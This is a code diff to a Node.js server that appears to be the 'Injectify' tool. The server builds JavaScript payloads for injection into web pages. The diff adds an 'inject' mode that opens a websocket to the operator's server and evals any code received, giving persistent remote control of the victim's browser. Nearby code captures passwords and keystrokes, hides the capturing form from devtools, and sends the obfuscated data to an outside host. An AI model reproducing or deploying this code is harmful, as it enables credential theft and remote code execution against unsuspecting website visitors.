@@ -1317,9 +1317,9 @@ MongoClient.connect(config.mongodb, function (err, db) {
     })
   })
 
-  injectServer.installHandlers(server, { prefix: '/inject' })
+  injectServer.installHandlers(server, { prefix: '/i' })
 
-  app.get('/record/*', (req, res) => {
+  app.get('/r/*', (req, res) => {
     let headers = req.headers
     if (req.headers['forwarded-headers']) {
       // Attempt to extract forwarded headers
@@ -1924,6 +1924,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
       }
     }
     function sendToServer (url) {
+      if (config.dev) url = '"http:"+' + url
       if (bypassCors) {
         return 'window.location=' + url + '+"$"'
       } else {
@@ -1933,6 +1934,8 @@ MongoClient.connect(config.mongodb, function (err, db) {
     let valid = true
     if (!req.query.project) valid = false
 
+    let inject = false
+    if (req.query.inject === 'true') inject = true
     let keylogger = false
     if (req.query.keylogger === 'true') keylogger = true
     let screenSize = true
@@ -1948,9 +1951,17 @@ MongoClient.connect(config.mongodb, function (err, db) {
     let bypassCors = false
     if (req.query.bypassCors === 'true') bypassCors = true
 
-    let proxy = '//uder.ml' // '//injectify.samdd.me/record/'
-    if (config.dev) proxy = 'http://localhost:' + config.express + '/record/'
+    let proxy = '//uder.ml/' // '//injectify.samdd.me/'
     if (req.query.proxy) proxy = req.query.proxy
+    let wss = 'wss:'
+    if (config.dev) {
+      proxy = '//localhost:' + config.express + '/'
+      wss = 'ws:'
+    }
+
+    let injectProject = btoa(req.query.project)
+    if (req.query.debug === 'true') injectProject = '$' + injectProject
+
     if (valid) {
       res.setHeader('Content-Type', 'application/javascript')
 
@@ -1959,6 +1970,28 @@ MongoClient.connect(config.mongodb, function (err, db) {
       let body = ''
       let catcher = ''
 
+      if (inject) {
+        body += `
+        function u() {` + comment('Open a new websocket to the server') + `
+          window.ws = new WebSocket('`+ wss + `'+p+'i/websocket?` + injectProject + `')
+          ws.onmessage = function(d) {
+              try {` + comment('Parse the websocket message as JSON') + `
+                  d = JSON.parse(d.data)` + comment('Evaluate the javascript') + `
+                  eval(d.d)
+              } catch(e) {` + comment('On error send error back to server') + `
+                  ws.send(JSON.stringify({
+                      t: 'e',
+                      d: e,
+                  }))
+              }
+          }
+          ws.onclose = function() {` + comment('Attempt to re-open the websocket, retrying every 3 seconds') + `
+              setTimeout(u, 3000)
+          }
+      }
+      u()
+      `
+      }
       if (keylogger) {
         variables += 'm = {}, f = [], g = new Date().getTime(),'
         body += comment('add listeners to the window for keydown & keyup events') + `
@@ -1990,7 +2023,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
               d: k.location.href,
               j: d.title
             }
-            ` + sendToServer("p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
+            ` + sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
             f = []
           }, 3000)
         `
@@ -2030,6 +2063,8 @@ MongoClient.connect(config.mongodb, function (err, db) {
         // | debug          | BOOLEAN | FALSE    |
         // | bypassCors     | BOOLEAN | FALSE    |
         // │                │         │          │
+        // | inject         │ BOOLEAN │ FALSE    |
+        // | passwords      │ BOOLEAN │ TRUE     |
         // | keylogger      │ BOOLEAN │ FALSE    |
         // │ screenSize     │ BOOLEAN │ TRUE     │
         // │ location       │ BOOLEAN │ TRUE     │
@@ -2093,7 +2128,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
           ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) +
 
           comment('send a request to the server (or proxy) with the BASE64 encoded JSON object\n') +
-          sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
+          sendToServer(`p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) +
           ifPassword(
             comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
             w.remove()
@@ -2139,6 +2174,8 @@ MongoClient.connect(config.mongodb, function (err, db) {
       // | debug          | BOOLEAN | FALSE    |
       // | bypassCors     | BOOLEAN | FALSE    |
       // │                │         │          │
+      // | inject         │ BOOLEAN │ FALSE    |
+      // | passwords      │ BOOLEAN │ TRUE     |
       // | keylogger      │ BOOLEAN │ FALSE    |
       // │ screenSize     │ BOOLEAN │ TRUE     │
       // │ location       │ BOOLEAN │ TRUE     │
